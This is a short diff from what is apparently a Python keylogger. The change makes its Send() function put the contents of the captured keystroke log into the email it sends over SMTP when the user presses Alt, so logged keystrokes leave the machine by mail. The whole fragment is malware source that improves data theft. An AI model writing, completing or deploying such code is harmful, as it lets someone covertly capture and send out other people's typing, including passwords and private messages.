@@ -34,7 +34,7 @@ def Send():
         msg['From'] = email
         msg['To'] = email
         msg['Subject'] = 'Key #{}'.format(count+1)
-        msg.attach(MIMEText('\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'))
+        msg.attach(MIMEText('{}\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'.format(ReadLogFile())))
         smtp.sendmail(email, email, msg.as_string())
         smtp.close()
         sys.exit(0)
